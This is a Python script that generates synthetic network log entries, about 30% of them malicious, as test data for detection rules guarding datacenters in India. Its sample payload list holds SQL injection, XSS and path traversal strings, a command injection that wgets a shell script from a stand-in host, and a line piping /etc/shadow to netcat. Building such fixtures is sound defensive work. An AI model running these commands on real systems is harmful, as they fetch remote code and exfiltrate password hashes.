import json
import random
import os
from datetime import datetime, timedelta

def generate_feed(count=100000):
    print(f"Generating {count} enterprise threat requests...")
    
    # Precise IOCs to trigger our YARA/Regex rules
    malicious_payloads = [
        "GET /index.php?id=1' OR '1'='1 --", # SQLi
        "<script>alert('XSS')</script>",   # XSS
        "../../../etc/passwd",               # Path Traversal
        "; wget http://malicious.com/shell.sh", # Command Injection
        "cat /etc/shadow | nc 192.168.1.1 4444",
        "SELECT * FROM users WHERE '1'='1'"
    ]
    
    attack_types = ["Malware", "DDoS", "Intrusion", "Scan / Probe"]
    protocols = ["TCP", "UDP", "ICMP"]
    
    # Target datacenters in India
    india_locations = ["Mumbai", "Bengaluru", "Delhi", "Chennai", "Hyderabad", "Pune"]
    
    data = []
    base_time = datetime.now()
    
    for i in range(count):
        is_malicious = random.random() < 0.3 # 30% malicious
        
        src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        # 70% of traffic originates from global, 30% local to India
        if random.random() < 0.3:
            src_country = "IN"
        else:
            src_country = random.choice(["US", "CN", "RU", "GB", "DE", "UA", "BR", "KP"])
            
        dst_city = random.choice(india_locations)
        
        payload = ""
        ml_class = "Benign"
        matched_rules = []
        
        if is_malicious:
            payload = random.choice(malicious_payloads)
            ml_class = random.choice(attack_types)
            # Simple simulation of rule matching
            if "'" in payload or "SELECT" in payload: matched_rules.append("SQL Injection Detected")
            if "<script>" in payload: matched_rules.append("XSS Attempt Detected")
            if "../" in payload: matched_rules.append("Path Traversal Detected")
            if ";" in payload or "|" in payload: matched_rules.append("Command Injection Detected")
        else:
            payload = f"GET /images/logo_{random.randint(1,100)}.png HTTP/1.1"
            
        entry = {
            "timestamp": (base_time + timedelta(milliseconds=i*100)).isoformat(),
            "protocol": random.choice(protocols),
            "src_ip": src_ip,
            "dst_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            "src_port": random.randint(1024, 65535),
            "dst_port": random.choice([80, 443, 8080, 22, 3306]),
            "packet_length": random.randint(40, 1500),
            "payload": payload,
            "ml_classification": ml_class,
            "geo": {
                "src_country": src_country,
                "dst_country": "IN",
                "dst_city": dst_city
            },
            "rule_alerts": matched_rules
        }
        data.append(entry)
        
    output_path = os.path.join(os.path.dirname(__file__), "enterprise_threat_feed.json")
    with open(output_path, "w") as f:
        json.dump(data, f)
    
    print(f"Generated {count} requests at {output_path}")

if __name__ == "__main__":
    generate_feed()
